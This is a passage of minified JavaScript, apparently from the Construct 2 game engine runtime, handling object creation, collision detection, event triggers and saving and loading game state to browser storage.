===d.collision_poly&&(d.collision_poly=null),d.collisionsEnabled=!0,this.redraw=!0}for(cr.clearArray(k),o=0,a=u.families.length;o<a;o++)k.push.apply(k,u.families[o].behaviors);if(k.push.apply(k,u.behaviors),d.recycled)for(o=0,a=k.length;o<a;o++){var v=k[o];for((m=d.behavior_insts[o]).recycled=!0,v.behavior.Instance.call(m,v,d),h=0,c=(f=t[4][o]).length;h<c;h++)m.properties[h]=f[h];m.onCreate(),v.behavior.my_instances.add(d)}else for(d.behavior_insts=[],o=0,a=k.length;o<a;o++)(m=new(v=k[o]).behavior.Instance(v,d)).recycled=!1,m.properties=t[4][o].slice(0),m.onCreate(),cr.seal(m),d.behavior_insts.push(m),v.behavior.my_instances.add(d);if(f=t[5],d.recycled)for(o=0,a=f.length;o<a;o++)d.properties[o]=f[o];else d.properties=f.slice(0);if(this.createRow.push(d),this.hasPendingInstances=!0,e&&(e.appendToInstanceList(d,!0),1===e.parallaxX&&1===e.parallaxY||(u.any_instance_parallaxed=!0)),this.objectcount++,u.is_contained){if(d.is_contained=!0,d.recycled?cr.clearArray(d.siblings):d.siblings=[],!i&&!r){for(o=0,a=u.container.length;o<a;o++)if(u.container[o]!==u){if(!u.container[o].default_instance)return null;d.siblings.push(this.createInstanceFromInit(u.container[o].default_instance,g,!1,p?d.x:s,p?d.y:n,!0))}for(o=0,a=d.siblings.length;o<a;o++)for(d.siblings[o].siblings.push(d),h=0;h<a;h++)o!==h&&d.siblings[o].siblings.push(d.siblings[h])}}else d.is_contained=!1,d.siblings=null;for(d.onCreate(),d.recycled||cr.seal(d),o=0,a=d.behavior_insts.length;o<a;o++)d.behavior_insts[o].postCreate&&d.behavior_insts[o].postCreate();return d},i.prototype.getLayerByName=function(t){for(var e=0,i=this.running_layout.layers.length;e<i;e++){var s=this.running_layout.layers[e];if(cr.equals_nocase(s.name,t))return s}return null},i.prototype.getLayerByNumber=function(t){return(t=cr.floor(t))<0&&(t=0),t>=this.running_layout.layers.length&&(t=this.running_layout.layers.length-1),this.running_layout.layers[t]},i.prototype.getLayer=function(t){return cr.is_number(t)?this.getLayerByNumber(t):this.getLayerByName(t.toString())},i.prototype.clearSol=function(t){for(var e=0,i=t.length;e<i;e++)t[e].getCurrentSol().select_all=!0},i.prototype.pushCleanSol=function(t){for(var e=0,i=t.length;e<i;e++)t[e].pushCleanSol()},i.prototype.pushCopySol=function(t){for(var e=0,i=t.length;e<i;e++)t[e].pushCopySol()},i.prototype.popSol=function(t){for(var e=0,i=t.length;e<i;e++)t[e].popSol()},i.prototype.updateAllCells=function(t){if(t.any_cell_changed){for(var e=t.instances,i=0,s=e.length;i<s;++i)e[i].update_collision_cell();var n=this.createRow;for(i=0,s=n.length;i<s;++i)n[i].type===t&&n[i].update_collision_cell();t.any_cell_changed=!1}},i.prototype.getCollisionCandidates=function(t,e,i,s){var n,r,o,a=!!t&&(1!==t.parallaxX||1!==t.parallaxY);if(e.is_family)for(n=0,r=e.members.length;n<r;++n)o=e.members[n],a||o.any_instance_parallaxed?cr.appendArray(s,o.instances):(this.updateAllCells(o),o.collision_grid.queryRange(i,s));else a||e.any_instance_parallaxed?cr.appendArray(s,e.instances):(this.updateAllCells(e),e.collision_grid.queryRange(i,s))},i.prototype.getTypesCollisionCandidates=function(t,e,i,s){for(var n=0,r=e.length;n<r;++n)this.getCollisionCandidates(t,e[n],i,s)},i.prototype.getSolidCollisionCandidates=function(t,e,i){var s=this.getSolidBehavior();if(!s)return null;this.getTypesCollisionCandidates(t,s.my_types,e,i)},i.prototype.getJumpthruCollisionCandidates=function(t,e,i){var s=this.getJumpthruBehavior();if(!s)return null;this.getTypesCollisionCandidates(t,s.my_types,e,i)},i.prototype.testAndSelectCanvasPointOverlap=function(t,e,i,s){var n,r,o,a,h,c,l,u=t.getCurrentSol(),p=this.getCurrentEventStack().current_event.orblock;if(u.select_all)for(s||(u.select_all=!1,cr.clearArray(u.instances)),n=0,a=t.instances.length;n<a;n++)if((o=t.instances[n]).update_bbox(),h=o.layer.canvasToLayer(e,i,!0),c=o.layer.canvasToLayer(e,i,!1),o.contains_pt(h,c)){if(s)return!1;u.instances.push(o)}else p&&u.else_instances.push(o);else{for(n=r=0,a=(l=p?u.else_instances:u.instances).length;n<a;n++)if((o=l[n]).update_bbox(),h=o.layer.canvasToLayer(e,i,!0),c=o.layer.canvasToLayer(e,i,!1),o.contains_pt(h,c)){if(s)return!1;p?u.instances.push(o):(u.instances[r]=u.instances[n],r++)}s||(l.length=r)}return t.applySolToContainer(),!!s||u.hasObjects()},i.prototype.testOverlap=function(t,e){if(!(t&&e&&t!==e&&t.collisionsEnabled&&e.collisionsEnabled))return!1;t.update_bbox(),e.update_bbox();var i,s,n,r,o,a,h,c,l,u,p=t.layer,d=e.layer;if(p===d||p.parallaxX===d.parallaxX&&d.parallaxY==d.parallaxY&&p.scale===d.scale&&p.angle===d.angle&&p.zoomRate===d.zoomRate)return!!t.bbox.intersects_rect(e.bbox)&&(!!t.bquad.intersects_quad(e.bquad)&&((!t.tilemap_exists||!e.tilemap_exists)&&(t.tilemap_exists?this.testTilemapOverlap(t,e):e.tilemap_exists?this.testTilemapOverlap(e,t):(h=t.collision_poly&&!t.collision_poly.is_empty(),c=e.collision_poly&&!e.collision_poly.is_empty(),!h&&!c||(l=h?(t.collision_poly.cache_poly(t.width,t.height,t.angle),t.collision_poly):(this.temp_poly.set_from_quad(t.bquad,t.x,t.y,t.width,t.height),this.temp_poly),u=c?(e.collision_poly.cache_poly(e.width,e.height,e.angle),e.collision_poly):(this.temp_poly.set_from_quad(e.bquad,e.x,e.y,e.width,e.height),this.temp_poly),l.intersects_poly(u,e.x-t.x,e.y-t.y))))));for(h=t.collision_poly&&!t.collision_poly.is_empty(),c=e.collision_poly&&!e.collision_poly.is_empty(),h?(t.collision_poly.cache_poly(t.width,t.height,t.angle),this.temp_poly.set_from_poly(t.collision_poly)):this.temp_poly.set_from_quad(t.bquad,t.x,t.y,t.width,t.height),l=this.temp_poly,c?(e.collision_poly.cache_poly(e.width,e.height,e.angle),this.temp_poly2.set_from_poly(e.collision_poly)):this.temp_poly2.set_from_quad(e.bquad,e.x,e.y,e.width,e.height),u=this.temp_poly2,i=0,s=l.pts_count;i<s;i++)r=(n=2*i)+1,o=l.pts_cache[n],a=l.pts_cache[r],l.pts_cache[n]=p.layerToCanvas(o+t.x,a+t.y,!0),l.pts_cache[r]=p.layerToCanvas(o+t.x,a+t.y,!1);for(l.update_bbox(),i=0,s=u.pts_count;i<s;i++)r=(n=2*i)+1,o=u.pts_cache[n],a=u.pts_cache[r],u.pts_cache[n]=d.layerToCanvas(o+e.x,a+e.y,!0),u.pts_cache[r]=d.layerToCanvas(o+e.x,a+e.y,!1);return u.update_bbox(),l.intersects_poly(u,0,0)};var p=new cr.quad,A=new cr.rect(0,0,0,0),E=[];i.prototype.testTilemapOverlap=function(t,e){var i,s,n=e.bbox,r=t.x,o=t.y;t.getCollisionRectCandidates(n,E);for(var a=E,h=e.collision_poly&&!e.collision_poly.is_empty(),c=0,l=a.length;c<l;++c)if(i=a[c],s=i.rc,n.intersects_rect_off(s,r,o)&&(p.set_from_rect(s),p.offset(r,o),p.intersects_quad(e.bquad)))if(h){if(e.collision_poly.cache_poly(e.width,e.height,e.angle),i.poly){if(i.poly.intersects_poly(e.collision_poly,e.x-(r+s.left),e.y-(o+s.top)))return cr.clearArray(E),!0}else if(this.temp_poly.set_from_quad(p,0,0,s.right-s.left,s.bottom-s.top),this.temp_poly.intersects_poly(e.collision_poly,e.x,e.y))return cr.clearArray(E),!0}else{if(!i.poly)return cr.clearArray(E),!0;if(this.temp_poly.set_from_quad(e.bquad,0,0,e.width,e.height),i.poly.intersects_poly(this.temp_poly,-(r+s.left),-(o+s.top)))return cr.clearArray(E),!0}return cr.clearArray(E),!1},i.prototype.testRectOverlap=function(t,e){if(!e||!e.collisionsEnabled)return!1;e.update_bbox();e.layer;if(!e.bbox.intersects_rect(t))return!1;if(e.tilemap_exists){e.getCollisionRectCandidates(t,E);for(var i,s,n=E,r=e.x,o=e.y,a=0,h=n.length;a<h;++a)if(s=(i=n[a]).rc,t.intersects_rect_off(s,r,o)){if(!i.poly)return cr.clearArray(E),!0;if(this.temp_poly.set_from_rect(t,0,0),i.poly.intersects_poly(this.temp_poly,-(r+s.left),-(o+s.top)))return cr.clearArray(E),!0}return cr.clearArray(E),!1}return p.set_from_rect(t),!!e.bquad.intersects_quad(p)&&(!(e.collision_poly&&!e.collision_poly.is_empty())||(e.collision_poly.cache_poly(e.width,e.height,e.angle),p.offset(-t.left,-t.top),this.temp_poly.set_from_quad(p,0,0,1,1),e.collision_poly.intersects_poly(this.temp_poly,t.left-e.x,t.top-e.y)))},i.prototype.testSegmentOverlap=function(t,e,i,s,n){if(!n||!n.collisionsEnabled)return!1;n.update_bbox();n.layer;if(A.set(cr.min(t,i),cr.min(e,s),cr.max(t,i),cr.max(e,s)),!n.bbox.intersects_rect(A))return!1;if(n.tilemap_exists){n.getCollisionRectCandidates(A,E);for(var r,o,a=E,h=n.x,c=n.y,l=0,u=a.length;l<u;++l)if(r=a[l],o=r.rc,A.intersects_rect_off(o,h,c)&&(p.set_from_rect(o),p.offset(h,c),p.intersects_segment(t,e,i,s))){if(!r.poly)return cr.clearArray(E),!0;if(r.poly.intersects_segment(h+o.left,c+o.top,t,e,i,s))return cr.clearArray(E),!0}return cr.clearArray(E),!1}return!!n.bquad.intersects_segment(t,e,i,s)&&(!(n.collision_poly&&!n.collision_poly.is_empty())||(n.collision_poly.cache_poly(n.width,n.height,n.angle),n.collision_poly.intersects_segment(n.x,n.y,t,e,i,s)))},i.prototype.typeHasBehavior=function(t,e){if(!e)return!1;for(var i,s,n,r=0,o=t.behaviors.length;r<o;r++)if(t.behaviors[r].behavior instanceof e)return!0;if(!t.is_family)for(r=0,o=t.families.length;r<o;r++)for(i=0,s=(n=t.families[r]).behaviors.length;i<s;i++)if(n.behaviors[i].behavior instanceof e)return!0;return!1},i.prototype.typeHasNoSaveBehavior=function(t){return this.typeHasBehavior(t,cr.behaviors.NoSave)},i.prototype.typeHasPersistBehavior=function(t){return this.typeHasBehavior(t,cr.behaviors.Persist)},i.prototype.getSolidBehavior=function(){return this.solidBehavior},i.prototype.getJumpthruBehavior=function(){return this.jumpthruBehavior};var o=[];i.prototype.testOverlapSolid=function(t){var e,i,s;for(t.update_bbox(),this.getSolidCollisionCandidates(t.layer,t.bbox,o),e=0,i=o.length;e<i;++e)if(s=o[e],s.extra.solidEnabled&&this.testOverlap(t,s))return cr.clearArray(o),s;return cr.clearArray(o),null},i.prototype.testRectOverlapSolid=function(t){var e,i,s;for(this.getSolidCollisionCandidates(null,t,o),e=0,i=o.length;e<i;++e)if(s=o[e],s.extra.solidEnabled&&this.testRectOverlap(t,s))return cr.clearArray(o),s;return cr.clearArray(o),null};var a=[];i.prototype.testOverlapJumpThru=function(t,e){var i,s,n,r=null;for(e&&(r=a,cr.clearArray(r)),t.update_bbox(),this.getJumpthruCollisionCandidates(t.layer,t.bbox,o),i=0,s=o.length;i<s;++i)if(n=o[i],n.extra.jumpthruEnabled&&this.testOverlap(t,n)){if(!e)return cr.clearArray(o),n;r.push(n)}return cr.clearArray(o),r},i.prototype.pushOutSolid=function(t,e,i,s,n,r){for(var o=s||50,a=t.x,h=t.y,c=null,l=null,u=0;u<o;u++)if(t.x=a+e*u,t.y=h+i*u,t.set_bbox_changed(),!this.testOverlap(t,c)&&(c=this.testOverlapSolid(t),c&&(l=c),!c&&(n&&(c=r?this.testOverlap(t,r)?r:null:this.testOverlapJumpThru(t))&&(l=c),!c)))return l&&this.pushInFractional(t,e,i,l,16),!0;return t.x=a,t.y=h,t.set_bbox_changed(),!1},i.prototype.pushOutSolidAxis=function(t,e,i,s){s=s||50;for(var n,r,o=t.x,a=t.y,h=null,c=null,l=0;l<s;++l)for(n=0;n<2;++n)if(r=2*n-1,t.x=o+e*l*r,t.y=a+i*l*r,t.set_bbox_changed(),!this.testOverlap(t,h)){if(!(h=this.testOverlapSolid(t)))return c&&this.pushInFractional(t,e*r,i*r,c,16),!0;c=h}return t.x=o,t.y=a,t.set_bbox_changed(),!1},i.prototype.pushOut=function(t,e,i,s,n){for(var r=s||50,o=t.x,a=t.y,h=0;h<r;h++)if(t.x=o+e*h,t.y=a+i*h,t.set_bbox_changed(),!this.testOverlap(t,n))return!0;return t.x=o,t.y=a,t.set_bbox_changed(),!1},i.prototype.pushInFractional=function(t,e,i,s,n){for(var r,o=2,a=!1,h=!1,c=t.x,l=t.y;o<=n;)r=1/o,o*=2,t.x+=e*r*(a?1:-1),t.y+=i*r*(a?1:-1),t.set_bbox_changed(),this.testOverlap(t,s)?h=a=!0:(h=a=!1,c=t.x,l=t.y);h&&(t.x=c,t.y=l,t.set_bbox_changed())},i.prototype.pushOutSolidNearest=function(t,e){var i=cr.is_undefined(e)?100:e,s=0,n=t.x,r=t.y,o=0,a=0,h=0,c=this.testOverlapSolid(t);if(!c)return!0;for(;s<=i;){switch(o){case 0:a=0,h=-1,s++;break;case 1:h=-(a=1);break;case 2:a=1,h=0;break;case 3:h=a=1;break;case 4:a=0,h=1;break;case 5:a=-1,h=1;break;case 6:a=-1,h=0;break;case 7:h=a=-1}if(o=(o+1)%8,t.x=cr.floor(n+a*s),t.y=cr.floor(r+h*s),t.set_bbox_changed(),!this.testOverlap(t,c)&&!(c=this.testOverlapSolid(t)))return!0}return t.x=n,t.y=r,t.set_bbox_changed(),!1},i.prototype.registerCollision=function(t,e){t.collisionsEnabled&&e.collisionsEnabled&&this.registered_collisions.push([t,e])},i.prototype.addRegisteredCollisionCandidates=function(t,e,i){for(var s,n,r=0,o=this.registered_collisions.length;r<o;++r){if((s=this.registered_collisions[r])[0]===t)n=s[1];else{if(s[1]!==t)continue;n=s[0]}if(e.is_family){if(-1===e.members.indexOf(e))continue}else if(n.type!==e)continue;-1===i.indexOf(n)&&i.push(n)}},i.prototype.checkRegisteredCollision=function(t,e){for(var i,s=0,n=this.registered_collisions.length;s<n;s++)if((i=this.registered_collisions[s])[0]===t&&i[1]===e||i[0]===e&&i[1]===t)return!0;return!1},i.prototype.calculateSolidBounceAngle=function(t,e,i,s){var n=t.x,r=t.y,o=cr.max(10,cr.distanceTo(e,i,n,r)),a=cr.angleTo(e,i,n,r),h=s||this.testOverlapSolid(t);if(!h)return cr.clamp_angle(a+cr.PI);for(var c,l,u,p=h,d=cr.to_radians(5),g=1;g<36;g++)if(c=a-g*d,t.x=e+Math.cos(c)*o,t.y=i+Math.sin(c)*o,t.set_bbox_changed(),!this.testOverlap(t,p)&&!(p=s?null:this.testOverlapSolid(t))){l=c;break}36===g&&(l=cr.clamp_angle(a+cr.PI));p=h;for(g=1;g<36;g++)if(c=a+g*d,t.x=e+Math.cos(c)*o,t.y=i+Math.sin(c)*o,t.set_bbox_changed(),!this.testOverlap(t,p)&&!(p=s?null:this.testOverlapSolid(t))){u=c;break}if(36===g&&(u=cr.clamp_angle(a+cr.PI)),t.x=n,t.y=r,t.set_bbox_changed(),u===l)return u;var f=cr.angleDiff(u,l)/2,m=cr.angleClockwise(u,l)?cr.clamp_angle(l+f+cr.PI):cr.clamp_angle(u+f),h=Math.cos(a),n=Math.sin(a),r=Math.cos(m),f=Math.sin(m),m=h*r+n*f,r=h-2*m*r,f=n-2*m*f;return cr.angleTo(0,0,r,f)};var I=-1;function l(){try{return window.indexedDB}catch(t){return}}function P(t){t.target.result.createObjectStore("saves",{keyPath:"slot"})}function M(){cr.logexport("Reloading for continuous preview"),window.c2cocoonjs?CocoonJS.App.reload():-1<window.location.search.indexOf("continuous")?window.location.reload(!0):window.location=window.location+"?continuous"}function F(t){var e,i={};for(e in t)t.hasOwnProperty(e)&&(t[e]instanceof cr.ObjectSet||t[e]&&void 0!==t[e].c2userdata||"spriteCreatedDestroyCallback"!==e&&(i[e]=t[e]));return i}i.prototype.trigger=function(t,e,i){if(!this.running_layout)return!1;var s=this.running_layout.event_sheet;if(!s)return!1;var n,r=!1;I++;for(var o=s.deep_includes,a=0,h=o.length;a<h;++a)n=this.triggerOnSheet(t,e,o[a],i),r=r||n;return n=this.triggerOnSheet(t,e,s,i),I--,r=r||n},i.prototype.triggerOnSheet=function(t,e,i,s){var n,r,o,a,h=!1;if(e)for(o=this.triggerOnSheetForTypeName(t,e,e.type.name,i,s),h=h||o,n=0,r=(a=e.type.families).length;n<r;++n)o=this.triggerOnSheetForTypeName(t,e,a[n].name,i,s),h=h||o;else o=this.triggerOnSheetForTypeName(t,e,"system",i,s),h=h||o;return h},i.prototype.triggerOnSheetForTypeName=function(t,e,i,s,n){var r,o,a,h=!1,c=void 0!==n,l=(c?s.fasttriggers:s.triggers)[i];if(!l)return h;for(var u,p=null,d=0,g=l.length;d<g;++d)if(l[d].method==t){p=l[d].evs;break}if(!p)return h;if(!(u=c?p[n]:p))return null;for(d=0,g=u.length;d<g;d++)o=u[d][0],a=u[d][1],r=this.executeSingleTrigger(e,i,o,a),h=h||r;return h},i.prototype.executeSingleTrigger=function(t,e,i,s){var n,r,o=!1;this.trigger_depth++;var a=this.getCurrentEventStack().current_event;a&&this.pushCleanSol(a.solModifiersIncludingParents);var h=1<this.trigger_depth;this.pushCleanSol(i.solModifiersIncludingParents),h&&this.pushLocalVarStack();var c,l=this.pushEventStack(i);l.current_event=i,t&&((c=this.types[e].getCurrentSol()).select_all=!1,cr.clearArray(c.instances),c.instances[0]=t,this.types[e].applySolToContainer());var u=!0;if(i.parent){for(var p=l.temp_parents_arr,d=i.parent;d;)p.push(d),d=d.parent;for(p.reverse(),n=0,r=p.length;n<r;n++)if(!p[n].run_pretrigger()){u=!1;break}}return u&&(this.execcount++,i.orblock?i.run_orblocktrigger(s):i.run(),o=o||l.last_event_true),this.popEventStack(),h&&this.popLocalVarStack(),this.popSol(i.solModifiersIncludingParents),a&&this.popSol(a.solModifiersIncludingParents),this.hasPendingInstances&&0===this.isInOnDestroy&&0===I&&!this.isRunningEvents&&this.ClearDeathRow(),this.trigger_depth--,o},i.prototype.getCurrentCondition=function(){var t=this.getCurrentEventStack();return t.current_event.conditions[t.cndindex]},i.prototype.getCurrentConditionObjectType=function(){return this.getCurrentCondition().type},i.prototype.isCurrentConditionFirst=function(){return 0===this.getCurrentEventStack().cndindex},i.prototype.getCurrentAction=function(){var t=this.getCurrentEventStack();return t.current_event.actions[t.actindex]},i.prototype.pushLocalVarStack=function(){this.localvar_stack_index++,this.localvar_stack_index>=this.localvar_stack.length&&this.localvar_stack.push([])},i.prototype.popLocalVarStack=function(){this.localvar_stack_index--},i.prototype.getCurrentLocalVarStack=function(){return this.localvar_stack[this.localvar_stack_index]},i.prototype.pushEventStack=function(t){this.event_stack_index++,this.event_stack_index>=this.event_stack.length&&this.event_stack.push(new cr.eventStackFrame);var e=this.getCurrentEventStack();return e.reset(t),e},i.prototype.popEventStack=function(){this.event_stack_index--},i.prototype.getCurrentEventStack=function(){return this.event_stack[this.event_stack_index]},i.prototype.pushLoopStack=function(t){this.loop_stack_index++,this.loop_stack_index>=this.loop_stack.length&&this.loop_stack.push(cr.seal({name:t,index:0,stopped:!1}));var e=this.getCurrentLoop();return e.name=t,e.index=0,e.stopped=!1,e},i.prototype.popLoopStack=function(){this.loop_stack_index--},i.prototype.getCurrentLoop=function(){return this.loop_stack[this.loop_stack_index]},i.prototype.getEventVariableByName=function(t,e){for(var i,s,n,r,o,a;e;){for(i=0,s=e.subevents.length;i<s;i++)if((a=e.subevents[i])instanceof cr.eventvariable&&cr.equals_nocase(t,a.name))return a;e=e.parent}for(i=0,s=this.eventsheets_by_index.length;i<s;i++)for(n=0,r=(o=this.eventsheets_by_index[i]).events.length;n<r;n++)if((a=o.events[n])instanceof cr.eventvariable&&cr.equals_nocase(t,a.name))return a;return null},i.prototype.getLayoutBySid=function(t){for(var e=0,i=this.layouts_by_index.length;e<i;e++)if(this.layouts_by_index[e].sid===t)return this.layouts_by_index[e];return null},i.prototype.getObjectTypeBySid=function(t){for(var e=0,i=this.types_by_index.length;e<i;e++)if(this.types_by_index[e].sid===t)return this.types_by_index[e];return null},i.prototype.getGroupBySid=function(t){for(var e=0,i=this.allGroups.length;e<i;e++)if(this.allGroups[e].sid===t)return this.allGroups[e];return null},i.prototype.doCanvasSnapshot=function(t,e){this.snapshotCanvas=[t,e],this.redraw=!0},i.prototype.signalContinuousPreview=function(){this.signalledContinuousPreview=!0},i.prototype.handleSaveLoad=function(){var i=this,t=this.saveToSlot,s=this.lastSaveJson,e=this.loadFromSlot,n=!1;if(this.signalledContinuousPreview&&(n=!0,t="__c2_continuouspreview",this.signalledContinuousPreview=!1),t.length){if(this.ClearDeathRow(),s=this.saveToJSONString(),l()&&!this.isCocoonJs)!function(e,i,s,n){try{var t=indexedDB.open("_C2SaveStates");t.onupgradeneeded=P,t.onerror=n,t.onsuccess=function(t){t=t.target.result;t.onerror=n,t.transaction(["saves"],"readwrite").objectStore("saves").put({slot:e,data:i}).onsuccess=s}}catch(t){n(t)}}(t,s,function(){cr.logexport("Saved state to IndexedDB storage ("+s.length+" bytes)"),i.lastSaveJson=s,i.trigger(cr.system_object.prototype.cnds.OnSaveComplete,null),i.lastSaveJson="",s="",n&&M()},function(e){try{localStorage.setItem("__c2save_"+t,s),cr.logexport("Saved state to WebStorage ("+s.length+" bytes)"),i.lastSaveJson=s,i.trigger(cr.system_object.prototype.cnds.OnSaveComplete,null),i.lastSaveJson="",s="",n&&M()}catch(t){cr.logexport("Failed to save game state: "+e+"; "+t),i.trigger(cr.system_object.prototype.cnds.OnSaveFailed,null)}});else try{localStorage.setItem("__c2save_"+t,s),cr.logexport("Saved state to WebStorage ("+s.length+" bytes)"),i.lastSaveJson=s,this.trigger(cr.system_object.prototype.cnds.OnSaveComplete,null),i.lastSaveJson="",s="",n&&M()}catch(t){cr.logexport("Error saving to WebStorage: "+t),i.trigger(cr.system_object.prototype.cnds.OnSaveFailed,null)}this.saveToSlot="",this.loadFromSlot="",this.loadFromJson=null}if(e.length){if(l()&&!this.isCocoonJs)!function(i,s,n){try{var t=indexedDB.open("_C2SaveStates");t.onupgradeneeded=P,t.onerror=n,t.onsuccess=function(t){t=t.target.result;t.onerror=n;var e=t.transaction(["saves"]).objectStore("saves").get(i);e.onsuccess=function(t){e.result?s(e.result.data):s(null)}}}catch(t){n(t)}}(e,function(t){t?(i.loadFromJson=t,cr.logexport("Loaded state from IndexedDB storage ("+i.loadFromJson.length+" bytes)")):(i.loadFromJson=localStorage.getItem("__c2save_"+e)||"",cr.logexport("Loaded state from WebStorage ("+i.loadFromJson.length+" bytes)")),i.suspendDrawing=!1,i.loadFromJson||(i.loadFromJson=null,i.trigger(cr.system_object.prototype.cnds.OnLoadFailed,null))},function(t){i.loadFromJson=localStorage.getItem("__c2save_"+e)||"",cr.logexport("Loaded state from WebStorage ("+i.loadFromJson.length+" bytes)"),i.suspendDrawing=!1,i.loadFromJson||(i.loadFromJson=null,i.trigger(cr.system_object.prototype.cnds.OnLoadFailed,null))});else{try{this.loadFromJson=localStorage.getItem("__c2save_"+e)||"",cr.logexport("Loaded state from WebStorage ("+this.loadFromJson.length+" bytes)")}catch(t){this.loadFromJson=null}this.suspendDrawing=!1,i.loadFromJson||(i.loadFromJson=null,i.trigger(cr.system_object.prototype.cnds.OnLoadFailed,null))}this.loadFromSlot="",this.saveToSlot=""}null!==this.loadFromJson&&(this.ClearDeathRow(),this.loadFromJSONString(this.loadFromJson)?(this.lastSaveJson=this.loadFromJson,this.trigger(cr.system_object.prototype.cnds.OnLoadComplete,null),this.lastSaveJson=""):i.trigger(cr.system_object.prototype.cnds.OnLoadFailed,null),this.loadFromJson=null)},i.prototype.saveToJSONString=function(){for(var t,e,i,s,n,r,o,a,h,c,l={c2save:!0,version:1,rt:{time:this.kahanTime.sum,walltime:this.wallTime.sum,timescale:this.timescale,tickcount:this.tickcount,execcount:this.execcount,next_uid:this.next_uid,running_layout:this.running_layout.sid,start_time_offset:Date.now()-this.start_time},types:{},layouts:{},events:{groups:{},cnds:{},acts:{},vars:{}}},u=0,p=this.types_by_index.length;u<p;u++)if(!(i=this.types_by_index[u]).is_family&&!this.typeHasNoSaveBehavior(i)){for(n={instances:[]},cr.hasAnyOwnProperty(i.extra)&&(n.ex=F(i.extra)),t=0,e=i.instances.length;t<e;t++)n.instances.push(this.saveInstanceToJSON(i.instances[t]));l.types[i.sid.toString()]=n}for(u=0,p=this.layouts_by_index.length;u<p;u++)s=this.layouts_by_index[u],l.layouts[s.sid.toString()]=s.saveToJSON();var d=l.events.groups;for(u=0,p=this.allGroups.length;u<p;u++)d[(r=this.allGroups[u]).sid.toString()]=this.groups_by_name[r.group_name].group_active;var g=l.events.cnds;for(c in this.cndsBySid)this.cndsBySid.hasOwnProperty(c)&&(o=this.cndsBySid[c],cr.hasAnyOwnProperty(o.extra)&&(g[c]={ex:F(o.extra)}));var f=l.events.acts;for(c in this.actsBySid)this.actsBySid.hasOwnProperty(c)&&(a=this.actsBySid[c],cr.hasAnyOwnProperty(a.extra)&&(f[c]={ex:F(a.extra)}));var m=l.events.vars;for(c in this.varsBySid)this.varsBySid.hasOwnProperty(c)&&((h=this.varsBySid[c]).is_constant||h.parent&&!h.is_static||(m[c]=h.data));return l.system=this.system.saveToJSON(),JSON.stringify(l)},i.prototype.refreshUidMap=function(){var t,e,i,s,n,r;for(this.objectsByUid={},t=0,e=this.types_by_index.length;t<e;t++)if(!(i=this.types_by_index[t]).is_family)for(s=0,n=i.instances.length;s<n;s++)r=i.instances[s],this.objectsByUid[r.uid.toString()]=r},i.prototype.loadFromJSONString=function(t){var e;try{e=JSON.parse(t)}catch(t){return!1}if(!e.c2save)return!1;if(1<e.version)return!1;this.isLoadingState=!0;var i=e.rt;this.kahanTime.reset(),this.kahanTime.sum=i.time,this.wallTime.reset(),this.wallTime.sum=i.walltime||0,this.timescale=i.timescale,this.tickcount=i.tickcount,this.execcount=i.execcount,this.start_time=Date.now()-i.start_time_offset;var s,n,r,o,a,h,c,l,u,p,d,g,f,m,y,_,v,b=i.running_layout;if(b!==this.running_layout.sid){b=this.getLayoutBySid(b);if(!b)return;this.doChangeLayout(b)}var w=e.types;for(c in w)if(w.hasOwnProperty(c)&&(l=this.getObjectTypeBySid(parseInt(c,10)))&&!l.is_family&&!this.typeHasNoSaveBehavior(l)){for(w[c].ex?l.extra=w[c].ex:cr.wipe(l.extra),u=l.instances,p=w[c].instances,s=0,n=cr.min(u.length,p.length);s<n;s++)this.loadInstanceFromJSON(u[s],p[s]);for(s=p.length,n=u.length;s<n;s++)this.DestroyInstance(u[s]);for(s=u.length,n=p.length;s<n;s++)m=null,l.plugin.is_world&&!(m=this.running_layout.getLayerBySid(p[s].w.l))||(d=this.createInstanceFromInit(l.default_instance,m,!1,0,0,!0),this.loadInstanceFromJSON(d,p[s]));l.stale_iids=!0}this.ClearDeathRow(),this.refreshUidMap();var x=e.layouts;for(c in x)x.hasOwnProperty(c)&&(f=this.getLayoutBySid(parseInt(c,10)))&&f.loadFromJSON(x[c]);var S=e.events.groups;for(c in S)S.hasOwnProperty(c)&&(y=this.getGroupBySid(parseInt(c,10)))&&this.groups_by_name[y.group_name]&&this.groups_by_name[y.group_name].setGroupActive(S[c]);var T=e.events.cnds;for(c in this.cndsBySid)this.cndsBySid.hasOwnProperty(c)&&(T.hasOwnProperty(c)?this.cndsBySid[c].extra=T[c].ex:this.cndsBySid[c].extra={});var C=e.events.acts;for(c in this.actsBySid)this.actsBySid.hasOwnProperty(c)&&(C.hasOwnProperty(c)?this.actsBySid[c].extra=C[c].ex:this.actsBySid[c].extra={});var O=e.events.vars;for(c in O)O.hasOwnProperty(c)&&this.varsBySid.hasOwnProperty(c)&&(this.varsBySid[c].data=O[c]);for(this.next_uid=i.next_uid,this.isLoadingState=!1,s=0,n=this.fireOnCreateAfterLoad.length;s<n;++s)d=this.fireOnCreateAfterLoad[s],this.trigger(Object.getPrototypeOf(d.type.plugin).cnds.OnCreated,d);for(cr.clearArray(this.fireOnCreateAfterLoad),this.system.loadFromJSON(e.system),s=0,n=this.types_by_index.length;s<n;s++)if(!(l=this.types_by_index[s]).is_family&&!this.typeHasNoSaveBehavior(l))for(r=0,o=l.instances.length;r<o;r++){if(d=l.instances[r],l.is_contained)for(_=d.get_iid(),cr.clearArray(d.siblings),a=0,h=l.container.length;a<h;a++)l!==(v=l.container[a])&&d.siblings.push(v.instances[_]);if(d.afterLoad&&d.afterLoad(),d.behavior_insts)for(a=0,h=d.behavior_insts.length;a<h;a++)(g=d.behavior_insts[a]).afterLoad&&g.afterLoad()}return this.redraw=!0},i.prototype.saveInstanceToJSON=function(t,e){var 